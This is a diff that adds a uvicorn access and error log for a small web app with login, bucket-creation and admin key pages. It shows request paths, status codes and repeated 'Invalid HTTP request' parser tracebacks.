+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.233.115.121:44126 - "GET /user/dashboard HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.233.115.121:44126 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.233.115.121:41456 - "GET /user/create-buckets HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.233.115.121:32938 - "POST /login HTTP/1.1" 302 Found
+INFO:     172.233.115.121:32938 - "GET /user/dashboard HTTP/1.1" 200 OK
+INFO:     172.233.115.121:32938 - "GET /user/create-buckets HTTP/1.1" 200 OK
+INFO:     172.233.115.121:52880 - "POST /user/create-buckets HTTP/1.1" 200 OK
+INFO:     20.46.244.172:54376 - "GET / HTTP/1.1" 200 OK
+INFO:     172.233.115.111:37460 - "GET /user/dashboard HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.233.115.111:37460 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.233.115.111:33218 - "GET /user/dashboard HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.233.115.111:33218 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.233.115.111:33250 - "GET /user/create-buckets HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.233.115.111:53834 - "GET /user/dashboard HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.233.115.111:53864 - "GET /user HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.233.115.111:44844 - "GET / HTTP/1.1" 200 OK
+INFO:     172.233.115.111:44844 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.233.115.111:35084 - "POST /login HTTP/1.1" 302 Found
+INFO:     172.233.115.111:35084 - "GET /user/dashboard HTTP/1.1" 200 OK
+INFO:     172.233.115.111:44224 - "GET /user/create-buckets HTTP/1.1" 200 OK
+INFO:     172.233.115.111:36204 - "POST /user/create-buckets HTTP/1.1" 200 OK
+INFO:     172.233.115.121:44470 - "GET /user/create-buckets HTTP/1.1" 200 OK
+INFO:     172.233.115.121:44470 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.233.115.121:44486 - "POST /user/create-buckets HTTP/1.1" 200 OK
+INFO:     172.233.115.121:43260 - "GET /user/create-buckets HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.233.115.121:43260 - "GET /user/create-buckets HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.233.115.121:43260 - "GET /user/ HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.233.115.121:43260 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.233.115.121:47864 - "GET /user/create-buckets HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.233.115.121:47864 - "GET /user/dashboard HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.233.115.121:47864 - "GET /user/dashboard HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.233.115.121:41996 - "POST /login HTTP/1.1" 302 Found
+INFO:     172.233.115.121:41996 - "GET /user/dashboard HTTP/1.1" 200 OK
+INFO:     172.233.115.121:41996 - "GET /user/create-buckets HTTP/1.1" 200 OK
+INFO:     172.233.115.121:53494 - "POST /user/create-buckets HTTP/1.1" 200 OK
+INFO:     172.233.115.121:55864 - "GET /user/create-buckets HTTP/1.1" 401 Unauthorized
+INFO:     172.233.115.121:35810 - "GET /user/create-buckets HTTP/1.1" 401 Unauthorized
+INFO:     172.233.115.121:35810 - "GET /user/create-buckets HTTP/1.1" 401 Unauthorized
+INFO:     172.233.115.121:35810 - "GET /user/create-buckets HTTP/1.1" 401 Unauthorized
+INFO:     172.233.115.121:35810 - "GET /user/create-buckets HTTP/1.1" 401 Unauthorized
+INFO:     172.233.115.121:35810 - "GET /user/create-buckets HTTP/1.1" 401 Unauthorized
+INFO:     172.233.115.121:35810 - "GET /user/create-buckets HTTP/1.1" 401 Unauthorized
+INFO:     172.233.115.121:35810 - "GET /user/create-buckets HTTP/1.1" 401 Unauthorized
+INFO:     172.233.115.121:39804 - "GET / HTTP/1.1" 200 OK
+INFO:     172.233.115.121:39818 - "POST /login HTTP/1.1" 302 Found
+INFO:     172.233.115.121:39818 - "GET /user/dashboard HTTP/1.1" 200 OK
+INFO:     172.233.115.121:39818 - "GET /user/create-buckets HTTP/1.1" 200 OK
+INFO:     172.233.115.121:34174 - "POST /user/create-buckets HTTP/1.1" 200 OK
+INFO:     41.142.126.155:54218 - "GET /user/create-buckets HTTP/1.1" 401 Unauthorized
+INFO:     41.142.126.155:58936 - "GET /robots.txt?488414 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:54218 - "GET /user/create-buckets HTTP/1.1" 401 Unauthorized
+INFO:     41.142.126.155:58936 - "GET /robots.txt?488414 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:54222 - "GET /robots.txt?488414 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:58903 - "GET /user/create-buckets HTTP/1.1" 401 Unauthorized
+INFO:     41.142.126.155:54224 - "GET /robots.txt?488414 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:58993 - "GET /logout HTTP/1.1" 302 Found
+INFO:     41.142.126.155:58993 - "GET /login HTTP/1.1" 200 OK
+INFO:     41.142.126.155:54226 - "GET /robots.txt?488414 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:54226 - "GET /robots.txt?488414 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:59087 - "GET /robots.txt?488414 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:59067 - "POST /login HTTP/1.1" 302 Found
+INFO:     41.142.126.155:59067 - "GET /user/dashboard HTTP/1.1" 200 OK
+INFO:     41.142.126.155:54230 - "GET /robots.txt?488414 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:54230 - "GET /robots.txt?488414 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:59171 - "GET /user/create-buckets HTTP/1.1" 200 OK
+INFO:     41.142.126.155:59269 - "GET /robots.txt?488414 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:54298 - "POST /user/create-buckets HTTP/1.1" 200 OK
+INFO:     41.142.126.155:59795 - "GET /robots.txt?488414 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:54358 - "GET /user/dashboard HTTP/1.1" 200 OK
+INFO:     41.142.126.155:54360 - "GET /robots.txt?488414 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:54370 - "GET /logout HTTP/1.1" 302 Found
+INFO:     41.142.126.155:54370 - "GET /login HTTP/1.1" 200 OK
+INFO:     41.142.126.155:54372 - "GET /robots.txt?488414 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:54372 - "GET /robots.txt?488414 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:54374 - "POST /login HTTP/1.1" 302 Found
+INFO:     41.142.126.155:54374 - "GET /admin/dashboard HTTP/1.1" 200 OK
+INFO:     41.142.126.155:54372 - "GET /robots.txt?488414 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:60365 - "GET /robots.txt?488414 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:60507 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:60847 - "POST /admin/keys/4/validate HTTP/1.1" 302 Found
+INFO:     41.142.126.155:60847 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:54476 - "GET /robots.txt?488414 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:54476 - "GET /robots.txt?488414 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:54478 - "GET /robots.txt?488414 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:60885 - "POST /admin/keys/4/unassign HTTP/1.1" 302 Found
+INFO:     41.142.126.155:60885 - "GET /admin/keys HTTP/1.1" 200 OK
+INFO:     41.142.126.155:54490 - "GET /robots.txt?488414 HTTP/1.1" 404 Not Found
+INFO:     41.142.126.155:54490 - "GET /robots.txt?488414 HTTP/1.1" 404 Not Found
+INFO:     172.233.115.121:43954 - "GET /user/create-buckets HTTP/1.1" 200 OK
+INFO:     172.233.115.121:43954 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.233.115.121:43958 - "POST /user/create-buckets HTTP/1.1" 200 OK
+INFO:     172.233.115.121:43958 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.233.115.111:41082 - "GET /user/create-buckets HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.233.115.111:41082 - "GET /user/create-buckets HTTP/1.1" 401 Unauthorized
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.233.115.111:41082 - "GET / HTTP/1.1" 200 OK
+INFO:     172.233.115.111:41082 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.233.115.111:41158 - "POST /login HTTP/1.1" 302 Found
+INFO:     172.233.115.111:41158 - "GET /user/dashboard HTTP/1.1" 200 OK
+INFO:     172.233.115.111:46932 - "GET /user/create-buckets HTTP/1.1" 200 OK
+INFO:     172.233.115.111:46932 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.233.115.111:58090 - "POST /user/create-buckets HTTP/1.1" 200 OK
+INFO:     172.233.115.111:58090 - "GET /favicon.ico HTTP/1.1" 404 Not Found
